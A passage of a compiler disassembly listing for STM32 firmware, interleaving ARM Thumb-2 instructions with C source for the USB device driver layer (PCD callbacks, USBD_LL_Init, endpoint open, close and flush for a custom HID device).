 800c930:	b580      	push	{r7, lr}
 800c932:	b082      	sub	sp, #8
 800c934:	af00      	add	r7, sp, #0
 800c936:	6078      	str	r0, [r7, #4]
 800c938:	460b      	mov	r3, r1
 800c93a:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800c93c:	687b      	ldr	r3, [r7, #4]
 800c93e:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c942:	78fa      	ldrb	r2, [r7, #3]
 800c944:	6879      	ldr	r1, [r7, #4]
 800c946:	4613      	mov	r3, r2
 800c948:	009b      	lsls	r3, r3, #2
 800c94a:	4413      	add	r3, r2
 800c94c:	00db      	lsls	r3, r3, #3
 800c94e:	440b      	add	r3, r1
 800c950:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800c954:	681a      	ldr	r2, [r3, #0]
 800c956:	78fb      	ldrb	r3, [r7, #3]
 800c958:	4619      	mov	r1, r3
 800c95a:	f7fe fbaa 	bl	800b0b2 <USBD_LL_DataOutStage>
}
 800c95e:	bf00      	nop
 800c960:	3708      	adds	r7, #8
 800c962:	46bd      	mov	sp, r7
 800c964:	bd80      	pop	{r7, pc}

0800c966 <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c966:	b580      	push	{r7, lr}
 800c968:	b082      	sub	sp, #8
 800c96a:	af00      	add	r7, sp, #0
 800c96c:	6078      	str	r0, [r7, #4]
 800c96e:	460b      	mov	r3, r1
 800c970:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800c972:	687b      	ldr	r3, [r7, #4]
 800c974:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c978:	78fa      	ldrb	r2, [r7, #3]
 800c97a:	6879      	ldr	r1, [r7, #4]
 800c97c:	4613      	mov	r3, r2
 800c97e:	009b      	lsls	r3, r3, #2
 800c980:	4413      	add	r3, r2
 800c982:	00db      	lsls	r3, r3, #3
 800c984:	440b      	add	r3, r1
 800c986:	333c      	adds	r3, #60	; 0x3c
 800c988:	681a      	ldr	r2, [r3, #0]
 800c98a:	78fb      	ldrb	r3, [r7, #3]
 800c98c:	4619      	mov	r1, r3
 800c98e:	f7fe fc43 	bl	800b218 <USBD_LL_DataInStage>
}
 800c992:	bf00      	nop
 800c994:	3708      	adds	r7, #8
 800c996:	46bd      	mov	sp, r7
 800c998:	bd80      	pop	{r7, pc}

0800c99a <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c99a:	b580      	push	{r7, lr}
 800c99c:	b082      	sub	sp, #8
 800c99e:	af00      	add	r7, sp, #0
 800c9a0:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800c9a2:	687b      	ldr	r3, [r7, #4]
 800c9a4:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9a8:	4618      	mov	r0, r3
 800c9aa:	f7fe fd7d 	bl	800b4a8 <USBD_LL_SOF>
}
 800c9ae:	bf00      	nop
 800c9b0:	3708      	adds	r7, #8
 800c9b2:	46bd      	mov	sp, r7
 800c9b4:	bd80      	pop	{r7, pc}

0800c9b6 <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c9b6:	b580      	push	{r7, lr}
 800c9b8:	b084      	sub	sp, #16
 800c9ba:	af00      	add	r7, sp, #0
 800c9bc:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800c9be:	2301      	movs	r3, #1
 800c9c0:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800c9c2:	687b      	ldr	r3, [r7, #4]
 800c9c4:	689b      	ldr	r3, [r3, #8]
 800c9c6:	2b02      	cmp	r3, #2
 800c9c8:	d001      	beq.n	800c9ce <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800c9ca:	f7f4 f985 	bl	8000cd8 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800c9ce:	687b      	ldr	r3, [r7, #4]
 800c9d0:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9d4:	7bfa      	ldrb	r2, [r7, #15]
 800c9d6:	4611      	mov	r1, r2
 800c9d8:	4618      	mov	r0, r3
 800c9da:	f7fe fd21 	bl	800b420 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800c9de:	687b      	ldr	r3, [r7, #4]
 800c9e0:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9e4:	4618      	mov	r0, r3
 800c9e6:	f7fe fcc9 	bl	800b37c <USBD_LL_Reset>
}
 800c9ea:	bf00      	nop
 800c9ec:	3710      	adds	r7, #16
 800c9ee:	46bd      	mov	sp, r7
 800c9f0:	bd80      	pop	{r7, pc}
	...

0800c9f4 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c9f4:	b580      	push	{r7, lr}
 800c9f6:	b082      	sub	sp, #8
 800c9f8:	af00      	add	r7, sp, #0
 800c9fa:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800c9fc:	687b      	ldr	r3, [r7, #4]
 800c9fe:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800ca02:	4618      	mov	r0, r3
 800ca04:	f7fe fd1c 	bl	800b440 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800ca08:	687b      	ldr	r3, [r7, #4]
 800ca0a:	699b      	ldr	r3, [r3, #24]
 800ca0c:	2b00      	cmp	r3, #0
 800ca0e:	d005      	beq.n	800ca1c <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800ca10:	4b04      	ldr	r3, [pc, #16]	; (800ca24 <HAL_PCD_SuspendCallback+0x30>)
 800ca12:	691b      	ldr	r3, [r3, #16]
 800ca14:	4a03      	ldr	r2, [pc, #12]	; (800ca24 <HAL_PCD_SuspendCallback+0x30>)
 800ca16:	f043 0306 	orr.w	r3, r3, #6
 800ca1a:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800ca1c:	bf00      	nop
 800ca1e:	3708      	adds	r7, #8
 800ca20:	46bd      	mov	sp, r7
 800ca22:	bd80      	pop	{r7, pc}
 800ca24:	e000ed00 	.word	0xe000ed00

0800ca28 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800ca28:	b580      	push	{r7, lr}
 800ca2a:	b082      	sub	sp, #8
 800ca2c:	af00      	add	r7, sp, #0
 800ca2e:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800ca30:	687b      	ldr	r3, [r7, #4]
 800ca32:	699b      	ldr	r3, [r3, #24]
 800ca34:	2b00      	cmp	r3, #0
 800ca36:	d007      	beq.n	800ca48 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800ca38:	4b08      	ldr	r3, [pc, #32]	; (800ca5c <HAL_PCD_ResumeCallback+0x34>)
 800ca3a:	691b      	ldr	r3, [r3, #16]
 800ca3c:	4a07      	ldr	r2, [pc, #28]	; (800ca5c <HAL_PCD_ResumeCallback+0x34>)
 800ca3e:	f023 0306 	bic.w	r3, r3, #6
 800ca42:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800ca44:	f000 faf0 	bl	800d028 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800ca48:	687b      	ldr	r3, [r7, #4]
 800ca4a:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800ca4e:	4618      	mov	r0, r3
 800ca50:	f7fe fd12 	bl	800b478 <USBD_LL_Resume>
}
 800ca54:	bf00      	nop
 800ca56:	3708      	adds	r7, #8
 800ca58:	46bd      	mov	sp, r7
 800ca5a:	bd80      	pop	{r7, pc}
 800ca5c:	e000ed00 	.word	0xe000ed00

0800ca60 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800ca60:	b580      	push	{r7, lr}
 800ca62:	b082      	sub	sp, #8
 800ca64:	af00      	add	r7, sp, #0
 800ca66:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800ca68:	f7f6 ff42 	bl	80038f0 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800ca6c:	4a26      	ldr	r2, [pc, #152]	; (800cb08 <USBD_LL_Init+0xa8>)
 800ca6e:	687b      	ldr	r3, [r7, #4]
 800ca70:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800ca74:	687b      	ldr	r3, [r7, #4]
 800ca76:	4a24      	ldr	r2, [pc, #144]	; (800cb08 <USBD_LL_Init+0xa8>)
 800ca78:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800ca7c:	4b22      	ldr	r3, [pc, #136]	; (800cb08 <USBD_LL_Init+0xa8>)
 800ca7e:	4a23      	ldr	r2, [pc, #140]	; (800cb0c <USBD_LL_Init+0xac>)
 800ca80:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800ca82:	4b21      	ldr	r3, [pc, #132]	; (800cb08 <USBD_LL_Init+0xa8>)
 800ca84:	2208      	movs	r2, #8
 800ca86:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800ca88:	4b1f      	ldr	r3, [pc, #124]	; (800cb08 <USBD_LL_Init+0xa8>)
 800ca8a:	2202      	movs	r2, #2
 800ca8c:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800ca8e:	4b1e      	ldr	r3, [pc, #120]	; (800cb08 <USBD_LL_Init+0xa8>)
 800ca90:	2202      	movs	r2, #2
 800ca92:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800ca94:	4b1c      	ldr	r3, [pc, #112]	; (800cb08 <USBD_LL_Init+0xa8>)
 800ca96:	2200      	movs	r2, #0
 800ca98:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800ca9a:	4b1b      	ldr	r3, [pc, #108]	; (800cb08 <USBD_LL_Init+0xa8>)
 800ca9c:	2200      	movs	r2, #0
 800ca9e:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800caa0:	4b19      	ldr	r3, [pc, #100]	; (800cb08 <USBD_LL_Init+0xa8>)
 800caa2:	2200      	movs	r2, #0
 800caa4:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800caa6:	4b18      	ldr	r3, [pc, #96]	; (800cb08 <USBD_LL_Init+0xa8>)
 800caa8:	2200      	movs	r2, #0
 800caaa:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800caac:	4816      	ldr	r0, [pc, #88]	; (800cb08 <USBD_LL_Init+0xa8>)
 800caae:	f7f5 f8e7 	bl	8001c80 <HAL_PCD_Init>
 800cab2:	4603      	mov	r3, r0
 800cab4:	2b00      	cmp	r3, #0
 800cab6:	d001      	beq.n	800cabc <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800cab8:	f7f4 f90e 	bl	8000cd8 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800cabc:	687b      	ldr	r3, [r7, #4]
 800cabe:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cac2:	2318      	movs	r3, #24
 800cac4:	2200      	movs	r2, #0
 800cac6:	2100      	movs	r1, #0
 800cac8:	f7f6 fe31 	bl	800372e <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800cacc:	687b      	ldr	r3, [r7, #4]
 800cace:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cad2:	2358      	movs	r3, #88	; 0x58
 800cad4:	2200      	movs	r2, #0
 800cad6:	2180      	movs	r1, #128	; 0x80
 800cad8:	f7f6 fe29 	bl	800372e <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800cadc:	687b      	ldr	r3, [r7, #4]
 800cade:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cae2:	2398      	movs	r3, #152	; 0x98
 800cae4:	2200      	movs	r2, #0
 800cae6:	2181      	movs	r1, #129	; 0x81
 800cae8:	f7f6 fe21 	bl	800372e <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800caec:	687b      	ldr	r3, [r7, #4]
 800caee:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800caf2:	23d8      	movs	r3, #216	; 0xd8
 800caf4:	2200      	movs	r2, #0
 800caf6:	2101      	movs	r1, #1
 800caf8:	f7f6 fe19 	bl	800372e <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800cafc:	2300      	movs	r3, #0
}
 800cafe:	4618      	mov	r0, r3
 800cb00:	3708      	adds	r7, #8
 800cb02:	46bd      	mov	sp, r7
 800cb04:	bd80      	pop	{r7, pc}
 800cb06:	bf00      	nop
 800cb08:	20000b7c 	.word	0x20000b7c
 800cb0c:	40006800 	.word	0x40006800

0800cb10 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800cb10:	b580      	push	{r7, lr}
 800cb12:	b084      	sub	sp, #16
 800cb14:	af00      	add	r7, sp, #0
 800cb16:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb18:	2300      	movs	r3, #0
 800cb1a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb1c:	2300      	movs	r3, #0
 800cb1e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800cb20:	687b      	ldr	r3, [r7, #4]
 800cb22:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cb26:	4618      	mov	r0, r3
 800cb28:	f7f5 f9b0 	bl	8001e8c <HAL_PCD_Start>
 800cb2c:	4603      	mov	r3, r0
 800cb2e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb30:	7bbb      	ldrb	r3, [r7, #14]
 800cb32:	2b03      	cmp	r3, #3
 800cb34:	d816      	bhi.n	800cb64 <USBD_LL_Start+0x54>
 800cb36:	a201      	add	r2, pc, #4	; (adr r2, 800cb3c <USBD_LL_Start+0x2c>)
 800cb38:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb3c:	0800cb4d 	.word	0x0800cb4d
 800cb40:	0800cb53 	.word	0x0800cb53
 800cb44:	0800cb59 	.word	0x0800cb59
 800cb48:	0800cb5f 	.word	0x0800cb5f
    case HAL_OK :
      usb_status = USBD_OK;
 800cb4c:	2300      	movs	r3, #0
 800cb4e:	73fb      	strb	r3, [r7, #15]
    break;
 800cb50:	e00b      	b.n	800cb6a <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cb52:	2303      	movs	r3, #3
 800cb54:	73fb      	strb	r3, [r7, #15]
    break;
 800cb56:	e008      	b.n	800cb6a <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cb58:	2301      	movs	r3, #1
 800cb5a:	73fb      	strb	r3, [r7, #15]
    break;
 800cb5c:	e005      	b.n	800cb6a <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cb5e:	2303      	movs	r3, #3
 800cb60:	73fb      	strb	r3, [r7, #15]
    break;
 800cb62:	e002      	b.n	800cb6a <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800cb64:	2303      	movs	r3, #3
 800cb66:	73fb      	strb	r3, [r7, #15]
    break;
 800cb68:	bf00      	nop
  }
  return usb_status;
 800cb6a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb6c:	4618      	mov	r0, r3
 800cb6e:	3710      	adds	r7, #16
 800cb70:	46bd      	mov	sp, r7
 800cb72:	bd80      	pop	{r7, pc}

0800cb74 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800cb74:	b580      	push	{r7, lr}
 800cb76:	b084      	sub	sp, #16
 800cb78:	af00      	add	r7, sp, #0
 800cb7a:	6078      	str	r0, [r7, #4]
 800cb7c:	4608      	mov	r0, r1
 800cb7e:	4611      	mov	r1, r2
 800cb80:	461a      	mov	r2, r3
 800cb82:	4603      	mov	r3, r0
 800cb84:	70fb      	strb	r3, [r7, #3]
 800cb86:	460b      	mov	r3, r1
 800cb88:	70bb      	strb	r3, [r7, #2]
 800cb8a:	4613      	mov	r3, r2
 800cb8c:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb8e:	2300      	movs	r3, #0
 800cb90:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb92:	2300      	movs	r3, #0
 800cb94:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cb96:	687b      	ldr	r3, [r7, #4]
 800cb98:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cb9c:	78bb      	ldrb	r3, [r7, #2]
 800cb9e:	883a      	ldrh	r2, [r7, #0]
 800cba0:	78f9      	ldrb	r1, [r7, #3]
 800cba2:	f7f5 fae1 	bl	8002168 <HAL_PCD_EP_Open>
 800cba6:	4603      	mov	r3, r0
 800cba8:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cbaa:	7bbb      	ldrb	r3, [r7, #14]
 800cbac:	2b03      	cmp	r3, #3
 800cbae:	d817      	bhi.n	800cbe0 <USBD_LL_OpenEP+0x6c>
 800cbb0:	a201      	add	r2, pc, #4	; (adr r2, 800cbb8 <USBD_LL_OpenEP+0x44>)
 800cbb2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cbb6:	bf00      	nop
 800cbb8:	0800cbc9 	.word	0x0800cbc9
 800cbbc:	0800cbcf 	.word	0x0800cbcf
 800cbc0:	0800cbd5 	.word	0x0800cbd5
 800cbc4:	0800cbdb 	.word	0x0800cbdb
    case HAL_OK :
      usb_status = USBD_OK;
 800cbc8:	2300      	movs	r3, #0
 800cbca:	73fb      	strb	r3, [r7, #15]
    break;
 800cbcc:	e00b      	b.n	800cbe6 <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cbce:	2303      	movs	r3, #3
 800cbd0:	73fb      	strb	r3, [r7, #15]
    break;
 800cbd2:	e008      	b.n	800cbe6 <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cbd4:	2301      	movs	r3, #1
 800cbd6:	73fb      	strb	r3, [r7, #15]
    break;
 800cbd8:	e005      	b.n	800cbe6 <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cbda:	2303      	movs	r3, #3
 800cbdc:	73fb      	strb	r3, [r7, #15]
    break;
 800cbde:	e002      	b.n	800cbe6 <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cbe0:	2303      	movs	r3, #3
 800cbe2:	73fb      	strb	r3, [r7, #15]
    break;
 800cbe4:	bf00      	nop
  }
  return usb_status;
 800cbe6:	7bfb      	ldrb	r3, [r7, #15]
}
 800cbe8:	4618      	mov	r0, r3
 800cbea:	3710      	adds	r7, #16
 800cbec:	46bd      	mov	sp, r7
 800cbee:	bd80      	pop	{r7, pc}

0800cbf0 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cbf0:	b580      	push	{r7, lr}
 800cbf2:	b084      	sub	sp, #16
 800cbf4:	af00      	add	r7, sp, #0
 800cbf6:	6078      	str	r0, [r7, #4]
 800cbf8:	460b      	mov	r3, r1
 800cbfa:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cbfc:	2300      	movs	r3, #0
 800cbfe:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc00:	2300      	movs	r3, #0
 800cc02:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cc04:	687b      	ldr	r3, [r7, #4]
 800cc06:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc0a:	78fa      	ldrb	r2, [r7, #3]
 800cc0c:	4611      	mov	r1, r2
 800cc0e:	4618      	mov	r0, r3
 800cc10:	f7f5 fb07 	bl	8002222 <HAL_PCD_EP_Close>
 800cc14:	4603      	mov	r3, r0
 800cc16:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc18:	7bbb      	ldrb	r3, [r7, #14]
 800cc1a:	2b03      	cmp	r3, #3
 800cc1c:	d816      	bhi.n	800cc4c <USBD_LL_CloseEP+0x5c>
 800cc1e:	a201      	add	r2, pc, #4	; (adr r2, 800cc24 <USBD_LL_CloseEP+0x34>)
 800cc20:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc24:	0800cc35 	.word	0x0800cc35
 800cc28:	0800cc3b 	.word	0x0800cc3b
 800cc2c:	0800cc41 	.word	0x0800cc41
 800cc30:	0800cc47 	.word	0x0800cc47
    case HAL_OK :
      usb_status = USBD_OK;
 800cc34:	2300      	movs	r3, #0
 800cc36:	73fb      	strb	r3, [r7, #15]
    break;
 800cc38:	e00b      	b.n	800cc52 <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc3a:	2303      	movs	r3, #3
 800cc3c:	73fb      	strb	r3, [r7, #15]
    break;
 800cc3e:	e008      	b.n	800cc52 <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc40:	2301      	movs	r3, #1
 800cc42:	73fb      	strb	r3, [r7, #15]
    break;
 800cc44:	e005      	b.n	800cc52 <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc46:	2303      	movs	r3, #3
 800cc48:	73fb      	strb	r3, [r7, #15]
    break;
 800cc4a:	e002      	b.n	800cc52 <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc4c:	2303      	movs	r3, #3
 800cc4e:	73fb      	strb	r3, [r7, #15]
    break;
 800cc50:	bf00      	nop
  }
  return usb_status;
 800cc52:	7bfb      	ldrb	r3, [r7, #15]
}
 800cc54:	4618      	mov	r0, r3
 800cc56:	3710      	adds	r7, #16
 800cc58:	46bd      	mov	sp, r7
 800cc5a:	bd80      	pop	{r7, pc}

0800cc5c <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cc5c:	b580      	push	{r7, lr}
 800cc5e:	b084      	sub	sp, #16
 800cc60:	af00      	add	r7, sp, #0
 800cc62:	6078      	str	r0, [r7, #4]
 800cc64:	460b      	mov	r3, r1
 800cc66:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc68:	2300      	movs	r3, #0
 800cc6a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc6c:	2300      	movs	r3, #0
 800cc6e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cc70:	687b      	ldr	r3, [r7, #4]
 800cc72:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc76:	78fa      	ldrb	r2, [r7, #3]
 800cc78:	4611      	mov	r1, r2
 800cc7a:	4618      	mov	r0, r3
 800cc7c:	f7f5 fc66 	bl	800254c <HAL_PCD_EP_Flush>
 800cc80:	4603      	mov	r3, r0
 800cc82:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc84:	7bbb      	ldrb	r3, [r7, #14]
 800cc86:	2b03      	cmp	r3, #3
 800cc88:	d816      	bhi.n	800ccb8 <USBD_LL_FlushEP+0x5c>
 800cc8a:	a201      	add	r2, pc, #4	; (adr r2, 800cc90 <USBD_LL_FlushEP+0x34>)
 800cc8c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc90:	0800cca1 	.word	0x0800cca1
 800cc94:	0800cca7 	.word	0x0800cca7
 800cc98:	0800ccad 	.word	0x0800ccad
 800cc9c:	0800ccb3 	.word	0x0800ccb3
    case HAL_OK :
      usb_status = USBD_OK;
 800cca0:	2300      	movs	r3, #0
 800cca2:	73fb      	strb	r3, [r7, #15]
    break;
 800cca4:	e00b      	b.n	800ccbe <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cca6:	2303      	movs	r3, #3
 800cca8:	73fb      	strb	r3, [r7, #15]
    break;
 800ccaa:	e008      	b.n	800ccbe <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ccac:	2301      	movs	r3, #1
 800ccae:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb0:	e005      	b.n	800ccbe <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ccb2:	2303      	movs	r3, #3
 800ccb4:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb6:	e002      	b.n	800ccbe <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ccb8:	2303      	movs	r3, #3
 800ccba:	73fb      	strb	r3, [r7, #15]
